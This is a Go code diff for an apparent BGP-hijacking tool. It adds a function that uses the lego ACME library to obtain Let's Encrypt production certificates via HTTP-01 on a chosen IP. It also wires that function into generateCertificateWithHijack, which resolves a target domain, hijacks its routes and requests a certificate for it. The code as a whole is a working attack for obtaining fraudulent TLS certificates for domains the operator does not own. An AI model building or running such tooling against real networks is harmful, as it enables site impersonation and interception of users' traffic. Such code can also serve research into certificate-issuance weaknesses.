@@ -2,18 +2,27 @@ package main
 
 import (
 	"context"
+	"crypto"
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
 	"encoding/json"
 	"fmt"
 	"log"
+	"net"
 	"os"
 	"strconv"
 	"strings"
 	"time"
-	"net"
 
 	api "github.com/osrg/gobgp/v3/api"
 	"bgpate/pkg/ripe"
 	"bgpate/pkg/utils"
+	"github.com/go-acme/lego/v4/certcrypto"
+	"github.com/go-acme/lego/v4/certificate"
+	"github.com/go-acme/lego/v4/challenge/http01"
+	"github.com/go-acme/lego/v4/lego"
+	"github.com/go-acme/lego/v4/registration"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"google.golang.org/protobuf/types/known/anypb"
@@ -29,6 +38,25 @@ type Config struct {
 }
 
 var config Config
+
+// MyUser implements acme.User
+type MyUser struct {
+	Email        string
+	Registration *registration.Resource
+	key          crypto.PrivateKey
+}
+
+func (u *MyUser) GetEmail() string {
+	return u.Email
+}
+
+func (u MyUser) GetRegistration() *registration.Resource {
+	return u.Registration
+}
+
+func (u *MyUser) GetPrivateKey() crypto.PrivateKey {
+	return u.key
+}
 
 func loadConfig() error {
 	file, err := os.ReadFile("config.json")
@@ -318,6 +346,74 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 	return nil
 }
 
+func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string, ip string, dryrun bool) error {
+	// Create a user. New accounts need an email and private key to start.
+	privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		return fmt.Errorf("failed to generate private key: %v", err)
+	}
+
+	myUser := MyUser{
+		Email: "admin@" + domain, // Using admin@domain as the contact email
+		key:   privateKey,
+	}
+
+	config := lego.NewConfig(&myUser)
+
+	// Use Let's Encrypt production server
+	config.CADirURL = lego.LEDirectoryProduction
+	config.Certificate.KeyType = certcrypto.RSA2048
+
+	// A client facilitates communication with the CA server.
+	legoClient, err := lego.NewClient(config)
+	if err != nil {
+		return fmt.Errorf("failed to create lego client: %v", err)
+	}
+
+	// We specify an HTTP port of 80 and on all interfaces
+	err = legoClient.Challenge.SetHTTP01Provider(http01.NewProviderServer(ip, "80"))
+	fmt.Printf("[DEBUG] Set HTTP01 provider for domain: %s on interface: %s\n", domain, ip)
+	if err != nil {
+		return fmt.Errorf("failed to set HTTP01 provider: %v", err)
+	}
+
+	// New users will need to register
+	reg, err := legoClient.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
+	if err != nil {
+		return fmt.Errorf("failed to register: %v", err)
+	}
+	myUser.Registration = reg
+
+	request := certificate.ObtainRequest{
+		Domains: []string{domain},
+		Bundle:  true,
+	}
+	// If it is a dryrun, we don't need to obtain certificate
+	if dryrun {
+		fmt.Printf("[DRYRUN] Would obtain certificate for domain: %s\n", domain)
+		return nil
+	}
+
+	certificates, err := legoClient.Certificate.Obtain(request)
+	if err != nil {
+		return fmt.Errorf("failed to obtain certificate: %v", err)
+	}
+
+	// Save the certificate and private key
+	certPath := fmt.Sprintf("certs/%s.crt", domain)
+	keyPath := fmt.Sprintf("certs/%s.key", domain)
+
+	if err := os.WriteFile(certPath, certificates.Certificate, 0644); err != nil {
+		return fmt.Errorf("failed to save certificate: %v", err)
+	}
+	if err := os.WriteFile(keyPath, certificates.PrivateKey, 0600); err != nil {
+		return fmt.Errorf("failed to save private key: %v", err)
+	}
+
+	fmt.Printf("Certificate and private key saved to %s and %s\n", certPath, keyPath)
+	return nil
+}
+
 func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Context, domain string, dryrun bool) error {
 	// trying to resolve domain to ip
 	ips, err := net.LookupIP(domain)
@@ -335,13 +431,13 @@ func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Contex
 	}
 
 	// TODO: Generate certificate
-	if err := generateCertificate(client, ctx, domain, dryrun); err != nil {
+	if err := generateCertificate(client, ctx, domain, ip.String(), dryrun); err != nil {
 		return fmt.Errorf("failed to generate certificate: %v", err)
 	}
 
 	// If it is a dryrun, we don't need to clear routes
 	if dryrun {
-		fmt.Println("Hijacked successfully")
+		fmt.Println("[DRYRUN] Would clear routes")
 		return nil
 	}
 
